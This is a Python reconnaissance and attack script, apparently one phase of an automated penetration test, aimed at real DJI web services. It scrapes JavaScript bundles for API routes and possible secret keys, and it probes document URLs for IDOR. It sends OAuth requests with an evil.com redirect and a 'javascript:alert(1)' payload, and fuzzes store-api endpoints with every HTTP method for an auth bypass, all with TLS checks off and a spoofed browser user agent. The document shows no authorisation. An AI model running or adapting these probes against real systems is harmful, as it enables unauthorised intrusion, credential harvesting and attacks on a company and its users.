#!/usr/bin/env python3
"""
Phase 2 deep analysis: PESop HF-3/HF-4/HF-5 deep testing
- Deep JS analysis on main bundles
- Document IDOR testing
- OAuth security testing
- API endpoint fuzzing
"""
import json
import re
import ssl
import time
import http.client
from urllib.parse import urlparse, urljoin
import urllib.request

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def fetch(url, method="GET", headers=None, body=None, timeout=15):
    if headers is None:
        headers = {}
    headers.setdefault("User-Agent", USER_AGENT)
    headers.setdefault("Accept", "*/*")

    parsed = urlparse(url)
    conn_cls = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query

    try:
        conn = conn_cls(parsed.netloc, timeout=timeout, context=ssl_ctx)
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        headers_out = dict(resp.getheaders())
        conn.close()
        return {
            "status": resp.status,
            "reason": resp.reason,
            "headers": headers_out,
            "body": data.decode("utf-8", errors="replace")[:2000],
        }
    except Exception as e:
        return {"status": 0, "error": str(e), "body": str(e), "headers": {}}


def deep_js_analysis(filename, label):
    """Deep regex extraction from large JS bundles."""
    try:
        with open(filename, "r", encoding="utf-8", errors="replace") as f:
            text = f.read()
    except:
        return {}

    print(f"\n{'='*60}")
    print(f"Deep JS Analysis: {label} ({len(text)} bytes)")
    print(f"{'='*60}")

    results = {}

    # Extract all string literals that look like API paths
    api_paths = set(
        re.findall(r'["\'](/[a-zA-Z0-9_\-/.{}]+(?:api|v[0-9]+|graphql|rest|rpc|service|sdk)[a-zA-Z0-9_\-/.{}]*)["\']', text)
    )
    print(f"\n[API Paths Found: {len(api_paths)}]")
    for p in sorted(api_paths)[:30]:
        print(f"  {p}")
    results["api_paths"] = sorted(api_paths)

    # Extract baseURL / apiPrefix / baseUrl configs
    url_configs = re.findall(
        r'(?:baseURL|baseUrl|apiPrefix|apiUrl|endpoint|proxyUrl|resourceUrl)\s*[=:]\s*["\']([^"\']+)["\']',
        text
    )
    if url_configs:
        print(f"\n[URL Configs: {len(url_configs)}]")
        for c in url_configs:
            print(f"  {c}")
    results["url_configs"] = url_configs

    # Extract fetch/http calls
    fetch_calls = set(re.findall(
        r'(?:axios|fetch|\$\.ajax|\$\.get|\$\.post|http\.get|http\.post|request)\s*[\(\[].*?["\']([^"\']+)["\']',
        text
    ))
    if fetch_calls:
        print(f"\n[HTTP Calls: {len(fetch_calls)}]")
        for c in sorted(fetch_calls)[:20]:
            print(f"  {c}")
    results["fetch_calls"] = sorted(fetch_calls)

    # Extract router configs
    router_paths = set(re.findall(
        r'["\'](/(?:[a-zA-Z0-9_\-]+/?){1,5})["\']\s*[,\]]',
        text
    ))
    router_paths = {p for p in router_paths if len(p) > 3 and p.count("/") >= 1 and not p.startswith(("http", "//"))}
    if router_paths:
        print(f"\n[Router Paths: {len(router_paths)}]")
        for p in sorted(router_paths)[:30]:
            print(f"  {p}")
    results["router_paths"] = sorted(router_paths)

    # Extract all URLs (http/https)
    all_urls = re.findall(r'https?://[a-zA-Z0-9._/-]+', text)
    dji_urls = {u for u in all_urls if any(d in u for d in [
        '.dji.com', '.djicdn.com', '.djiservice.org', '.djivideos.com'
    ])}
    if dji_urls:
        print(f"\n[DJI URLs: {len(dji_urls)}]")
        for u in sorted(dji_urls)[:20]:
            print(f"  {u}")
    results["dji_urls"] = sorted(dji_urls)

    # Extract potential API keys / tokens
    api_keys = re.findall(r'["\']([a-zA-Z0-9_\-]{20,64})["\']', text)
    interesting_keys = [k for k in api_keys if not re.match(r'^[a-zA-Z0-9+/=]{20,64}$', k) and any(
        c.isupper() for c in k[:5]) and not k.startswith(("http", "https", "function", "return", "typeof", "Object"))]
    if interesting_keys:
        print(f"\n[Potential Keys: {len(interesting_keys)}]")
        for k in interesting_keys[:20]:
            print(f"  {k}")
    results["potential_keys"] = interesting_keys[:50]

    return results


def test_document_idor():
    """Test IDOR on /document/{uuid} endpoints."""
    print(f"\n{'='*60}")
    print("IDOR Testing: /document/{uuid}")
    print(f"{'='*60}")

    # Known UUIDs from JS extraction
    test_uuids = [
        "2103887e-6d62-4f52-b508-348e57f69244",
        "32ae17fb-bfa0-4f18-9d12-7a95253ee4e4",
        "26cd55ae-ef09-4463-b941-d6bb2bb98461",
        "d0e1e15e-76de-439a-8e0c-a15e79085fb0",
        "00000000-0000-0000-0000-000000000001",
        "00000000-0000-0000-0000-000000000000",
        "ffffffff-ffff-ffff-ffff-ffffffffffff",
    ]

    base_url = "https://developer.dji.com/document"
    results_list = []

    for uuid in test_uuids:
        url = f"{base_url}/{uuid}"
        result = fetch(url)
        entry = {
            "url": url,
            "uuid": uuid,
            "status": result["status"],
            "has_content": len(result.get("body", "")) > 500,
            "body_preview": result.get("body", "")[:300],
        }
        print(f"  [{result['status']}] {url[:80]}...")
        if result["status"] == 200 and entry["has_content"]:
            print(f"    -> Content available (non-empty page)")
        results_list.append(entry)

    return results_list


def test_oauth_deep():
    """Deep OAuth security testing."""
    print(f"\n{'='*60}")
    print("OAuth Deep Testing: account.dji.com")
    print(f"{'='*60}")

    tests = [
        # Open redirect test
        ("https://account.dji.com/oauth/authorize?response_type=code&client_id=test&redirect_uri=https://evil.com", "Open Redirect"),
        ("https://account.dji.com/oauth/authorize?response_type=code&client_id=test&redirect_uri=javascript:alert(1)", "XSS via redirect_uri"),
        # CSRF test - missing state
        ("https://account.dji.com/oauth/authorize?response_type=code&client_id=test&redirect_uri=https://developer.dji.com", "Missing state/CSRF"),
        # Client ID enumeration
        ("https://account.dji.com/oauth/authorize?response_type=code&client_id=invalid_client&redirect_uri=https://developer.dji.com", "Invalid client_id"),
        ("https://account.dji.com/oauth/authorize?response_type=code&client_id=dji_sdk&redirect_uri=https://developer.dji.com", "Valid client_id"),
        # Login endpoint tests
        ("https://account.dji.com/login/oauth?appId=dji_sdk&backUrl=https://developer.dji.com/user&locale=en_US", "OAuth login with backUrl"),
        ("https://account.dji.com/login?appId=dji_sdk&backUrl=https://evil.com", "Open redirect in login"),
        # Token endpoint tests
        ("https://account.dji.com/oauth/token", "Token endpoint unauthorized"),
        ("https://account.dji.com/oauth/token?grant_type=client_credentials", "Client credentials grant"),
        ("https://account.dji.com/oauth/token?grant_type=authorization_code&code=test&redirect_uri=https://developer.dji.com", "Auth code exchange"),
    ]

    results_list = []
    for url, desc in tests:
        result = fetch(url)
        loc = result["headers"].get("Location", result["headers"].get("location", "N/A"))
        entry = {
            "test": desc,
            "url": url[:80],
            "status": result["status"],
            "location": loc if result["status"] in (301, 302, 307, 308) else "N/A",
            "body": result.get("body", "")[:200],
        }

        # Check for open redirect
        if result["status"] in (301, 302, 307, 308):
            if any(d in loc.lower() for d in ["javascript:", "data:", "evil.com", "attacker"]):
                entry["vulnerability"] = "OPEN_REDIRECT"
                print(f"  [!] OPEN REDIRECT [{result['status']}] {desc}")
                print(f"      Location: {loc}")
            elif loc:
                print(f"  [*] Redirect [{result['status']}] {desc} -> {loc}")
            else:
                print(f"  [{result['status']}] {desc}")

        elif result["status"] == 200:
            # Check if page contains auth form or error
            body = result.get("body", "")
            if "login" in body.lower() or "password" in body.lower():
                print(f"  [200] {desc} -> Login page")
            else:
                print(f"  [200] {desc} -> {body[:100]}")
        elif result["status"] == 401:
            print(f"  [401] {desc}")
        else:
            print(f"  [{result['status']}] {desc}")

        results_list.append(entry)

    return results_list


def api_endpoint_fuzzing():
    """Fuzz discovered API endpoints for HTTP methods and auth bypass."""
    print(f"\n{'='*60}")
    print("API Endpoint Fuzzing: store-api.dji.com")
    print(f"{'='*60}")

    base = "https://store-api.dji.com"
    endpoints = ["/logger/beacon.gif", "/health", "/api/v1/", "/api/v2/", "/graphql", "/rest/"]

    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

    for ep in endpoints:
        url = f"{base}{ep}"
        print(f"\n  Target: {url}")
        for method in methods:
            r = fetch(url, method=method)
            status = r["status"]
            body = r.get("body", "")[:100]
            if status not in (404, 405, 0):
                print(f"    {method:8s} -> {status}: {body}")
            elif status == 405:
                print(f"    {method:8s} -> 405 Method Not Allowed")
            elif status == 0:
                print(f"    {method:8s} -> ERROR: {r.get('error', '')[:50]}")


def analyze_api_structure():
    """Deep analysis of JS files for API route structure and patterns."""
    print(f"\n{'='*60}")
    print("API Structure Analysis from JS bundles")
    print(f"{'='*60}")

    bundles = [
        "/home/opencode/PESop/target/js_bundles/7f7d741d7a8cb943fba3.js",
        "/home/opencode/PESop/target/js_bundles/c448dccdf6c530953a2f.js",
        "/home/opencode/PESop/target/js_bundles/0477e1233ec3aad4a62d.js",
    ]

    for bundle_path in bundles:
        try:
            with open(bundle_path, "r", encoding="utf-8", errors="replace") as f:
                text = f.read()
        except:
            print(f"  [!] Could not read {bundle_path}")
            continue

        label = bundle_path.split("/")[-1][:20]
        print(f"\n--- {label} ({len(text)} bytes) ---")

        # Look for API base URL patterns
        api_bases = set(re.findall(r'["\'](https?://[^"\']+api[^"\']*)["\']', text))
        if api_bases:
            print(f"  API Base URLs: {api_bases}")

        # Look for app-specific config
        config_patterns = re.findall(
            r'["\'](https?://[^"\']+(?:developer|store|account|sdk)[^"\']*/\w+(?:/|$))["\']',
            text
        )
        if config_patterns:
            print(f"  DJI Service URLs: {list(set(config_patterns))[:10]}")

        # Look for OAuth related endpoints
        oauth_paths = set(re.findall(r'["\'](/oauth/[^"\']+)["\']', text))
        if oauth_paths:
            print(f"  OAuth Paths: {oauth_paths}")

        # Look for interceptor patterns (axios interceptors often reveal API behavior)
        interceptors = re.findall(r'(?:interceptor|intercept)\s*\.\s*(?:request|response)[^}]+}', text,
                                  re.IGNORECASE | re.DOTALL)
        if interceptors:
            print(f"  Found {len(interceptors)} interceptor definitions")

        # Extract all document/{uuid} references
        doc_uuids = re.findall(r'["\']/document/([a-f0-9-]+)["\']', text)
        if doc_uuids:
            print(f"  Document UUIDs: {list(set(doc_uuids))[:10]}")

        # Look for content types and API response patterns
        content_types = set(re.findall(r'["\'](application/(?:json|xml|octet-stream|form-urlencoded))["\']', text))
        if content_types:
            print(f"  Content Types: {content_types}")

        # Extract HTTP method configurations
        http_methods = set(re.findall(r'["\'](GET|POST|PUT|DELETE|PATCH|OPTIONS)["\']', text))
        if http_methods:
            print(f"  HTTP Methods: {http_methods}")

        # Look for AJAX/fetch calls with method + URL
        ajax_calls = re.findall(r'["\'](GET|POST|PUT|DELETE|PATCH)["\'].*?["\'](/[a-zA-Z0-9_\-/.]+)["\']', text)
        if ajax_calls:
            print(f"  AJAX Calls (method+path): {list(set(ajax_calls))[:10]}")

        # Check if Angular
        if "angular" in text.lower() and "@angular" in text:
            print("  Framework: Angular")
        if "react" in text.lower() or "react-dom" in text.lower():
            print("  Framework: React")
        if "vue" in text.lower():
            print("  Framework: Vue")


def main():
    print(f"\n{'#'*60}")
    print(f"PESop Phase 2 Deep Testing: developer.dji.com")
    print(f"Start: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")
    print(f"{'#'*60}")

    # Test document IDOR
    idor_results = test_document_idor()

    # Test OAuth deep
    oauth_results = test_oauth_deep()

    # API endpoint fuzzing
    api_endpoint_fuzzing()

    # API structure analysis
    analyze_api_structure()

    # Save results
    output = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "document_idor": idor_results,
        "oauth_deep": oauth_results,
    }

    with open("/home/opencode/PESop/target/dji_phase2_deep.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False, default=str)

    print(f"\n{'#'*60}")
    print(f"Phase 2 complete. Results saved.")
    print(f"{'#'*60}")


if __name__ == "__main__":
    main()